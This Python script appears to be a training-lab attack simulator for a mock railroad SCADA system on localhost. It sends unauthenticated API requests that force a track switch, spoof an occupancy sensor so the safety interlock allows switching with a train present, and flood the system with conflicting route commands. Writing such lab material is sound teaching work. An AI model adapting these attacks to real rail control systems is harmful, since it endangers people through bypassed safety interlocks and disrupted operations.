#!/usr/bin/env python3
"""
Railroad North - OT Attack Simulation
Demonstrates unauthorized SCADA API manipulation
"""

import sys
import time
import json
import urllib.request
import urllib.error

MASTER_URL = "http://localhost:8085" # exposed Master PLC port
SLAVE_1_URL = "http://localhost:8086" # exposed Slave 1 port

def send_post(url, data):
    req = urllib.request.Request(url, data=json.dumps(data).encode('utf-8'), 
                                 headers={'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req) as response:
            return json.loads(response.read().decode())
    except Exception as e:
        return f"Error: {e}"

def attack_track_switch():
    print("\n[*] ATTACK 1: Unauthorized Track Switching")
    print("    Target: Master PLC API (/api/command)")
    print("    Action: Forcing Segment 2 to switch to ROUTE_B (Local Siding)...")
    
    time.sleep(2)
    payload = {"segment_id": 2, "route": "ROUTE_B"}
    result = send_post(f"{MASTER_URL}/api/command", payload)
    
    print(f"    [!] Result: {result}")
    print("    [!] Check the SCADA Dashboard. Segment 2 should now show 'ROUTE_B'.")

def attack_safety_bypass():
    print("\n[*] ATTACK 2: Safety Interlock Bypass (Sensor Spoofing)")
    print("    Target: Slave PLC 1 API (/api/device/set)")
    print("    Action: Spoofing the Occupancy Sensor to report 'CLEAR'...")
    
    time.sleep(2)
    payload = {"device": "Occupancy Segment 1", "value": False}
    result = send_post(f"{SLAVE_1_URL}/api/device/set", payload)
    
    print(f"    [!] Result: {result}")
    print("    [!] The Master PLC now thinks the track is empty.")
    print("    [!] You can now switch tracks even if a train is physically there!")

def attack_alarm_flood():
    print("\n[*] ATTACK 3: SCADA Alarm Flooding (Denial of Service)")
    print("    Target: Master PLC API (/api/command)")
    print("    Action: Flooding system with conflicting route commands...")
    
    print("    [!] Sending 50 rapid requests...")
    for i in range(50):
        route = "ROUTE_A" if i % 2 == 0 else "ROUTE_B"
        payload = {"segment_id": 3, "route": route}
        send_post(f"{MASTER_URL}/api/command", payload)
        time.sleep(0.1)
    
    print("    [!] Flood complete.")
    print("    [!] Check the SCADA Dashboard. The Audit Log should be overwhelmed.")

def main():
    print("╔════════════════════════════════════════════════╗")
    print("║     Railroad North - SCADA Attack Simulator    ║")
    print("║     FOR TRAINING PURPOSES ONLY                 ║")
    print("╚════════════════════════════════════════════════╝")
    print("\nSelect an attack vector:")
    print("1) Unauthorized Track Switching (Level 2 Attack)")
    print("2) Safety Interlock Bypass / Sensor Spoofing (Level 1 Attack)")
    print("3) SCADA Alarm Flooding / DoS (Level 3 Attack)")
    
    choice = input("\nEnter choice (1, 2, or 3): ").strip()
    
    if choice == '1':
        attack_track_switch()
    elif choice == '2':
        attack_safety_bypass()
    elif choice == '3':
        attack_alarm_flood()
    else:
        print("Invalid choice.")

if __name__ == '__main__':
    main()
